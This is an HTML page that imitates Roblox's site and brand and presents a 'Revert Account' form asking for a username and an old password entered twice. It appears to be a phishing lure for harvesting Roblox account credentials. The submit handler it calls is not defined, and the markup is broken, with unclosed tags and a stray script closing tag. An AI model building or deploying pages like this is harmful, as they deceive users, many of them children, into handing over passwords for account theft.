
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Revert Account</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,Helvetica,sans-serif;
}

body{
background:#121212;
color:#e0e0e0;
}

/* NAVBAR */

.nav{
height:48px;
background:#1e1e1e;
border-bottom:1px solid #333;

display:flex;
align-items:center;

padding:0 12px;
}

.logo{
width:32px;
height:32px;

display:flex;
align-items:center;
justify-content:center;

margin-right:18px;
}

.logo img{

width:28px;
height:28px;
object-fit:contain;

}

.nav a{

text-decoration:none;
color:#ccc;

font-size:15px;

margin-right:35px;

}

.nav a:hover {
color:#fff;
}

.searchWrap{

flex:1;

display:flex;

justify-content:center;

}

.search{

width:420px;
height:30px;

padding-left:12px;

border:1px solid #444;

border-radius:4px;

background:#2a2a2a;

color:#e0e0e0;

outline:none;

}

.search::placeholder {
color:#888;
}

.right{

display:flex;

margin-left:20px;

}

.signup{

height:32px;

padding:0 15px;

border:none;

background:#335fff;

color:white;

border-radius:4px;

cursor:pointer;

}

.signup:hover {
background:#4a70ff;
}

.login{

height:32px;

padding:0 15px;

margin-left:8px;

background:#2a2a2a;

color:#ccc;

border:1px solid #444;

border-radius:4px;

cursor:pointer;

}

.login:hover {
background:#333;
color:#fff;
}

/* CARD */

.center{

display:flex;

justify-content:center;

margin-top:50px;

}

.card{

width:440px;

background:#1a1a1a;

padding:18px;

border:1px solid #333;

border-radius:6px;

}

.title{

font-size:36px;

font-weight:bold;

text-align:center;

margin-bottom:20px;

color:#f0f0f0;

}

.text{

font-size:16px;

line-height:1.5;

margin-bottom:15px;

color:#bbb;

}

.profile{

display:none;

text-align:center;

margin-bottom:15px;

}

.profile img{

width:70px;
height:70px;

border-radius:50%;

margin-bottom:10px;

border:2px solid #444;

}

#display {
color:#f0f0f0;
font-weight:bold;
}

#user {
color:#aaa;
}

.warning{

background:#2a2a2a;

padding:8px;

border:1px solid #cc8800;

color:#ffcc00;

font-size:14px;

font-weight:bold;

border-radius:4px;

}

.input{

width:100%;

height:40px;

padding-left:12px;

margin-top:15px;

border:1px solid #444;

border-radius:4px;

background:#252525;

color:#e0e0e0;

outline:none;

}

.input:focus {
border-color:#335fff;
}

.input::placeholder {
color:#777;
}

.password-input{
width:100%;

height:40px;

padding-left:12px;

margin-top:15px;

border:1px solid #444;

border-radius:4px;

background:#252525;

color:#e0e0e0;

outline:none;
}

.password-input:focus {
border-color:#335fff;
}

.password-input::placeholder {
color:#777;
}

.submit{

width:100%;

height:40px;

margin-top:15px;

background:#333;

border:1px solid #555;

border-radius:4px;

cursor:pointer;

color:#aaa;

font-size:15px;

transition:background 0.15s, color 0.15s;

}

.submit:hover {
background:#444;
color:#f0f0f0;
}

/* FOOTER */

.footer{

margin-top:140px;

text-align:center;

font-size:14px;

color:#777;

}

.footer span{

margin:0 8px;

cursor:pointer;

}

.footer span:hover {
color:#ccc;
}

.bottom{

margin-top:35px;

padding-top:25px;

border-top:1px solid #2a2a2a;

text-align:center;

font-size:11px;

color:#666;

}

</style>

</head>

<body>

<div class="nav">

<div class="logo">

<img src="https://devforum-uploads.s3.dualstack.us-east-2.amazonaws.com/uploads/original/4X/0/e/e/0eeeb19633422b1241f4306419a0f15f39d58de9.png">

</div>

<a href="#">Charts</a>
<a href="#">Marketplace</a>
<a href="#">Create</a>
<a href="#">Robux</a>

<div class="searchWrap">

<input
class="search"
placeholder="Search">

</div>

<div class="right">

<button class="signup">
Sign Up
</button>

<button class="login">
Log In
</button>

</div>

</div>


<div class="center">

<div class="card">

<div class="title">

Revert Account

<div

<div class="warning">

⚠ Enter Username

<input
id="username"
class="input"
placeholder="Username">

<input
id="password1"
class="password-input"
type="password"
placeholder="Old Password">

<input
id="password2"
class="password-input"
type="password"
placeholder="Confirm Old Password">

<button
class="submit"
onclick="loadProfile()">

Submit

</button>

</div>

</div>

<div class="footer">

<span>About Us</span>
<span>Jobs</span>
<span>Blog</span>
<span>Parents</span>
<span>Gift Cards</span>
<span>Help</span>
<span>Terms</span>

</div>

<div class="bottom">

©2026 Roblox Corporation

</div>

</script>

</body>
</html>
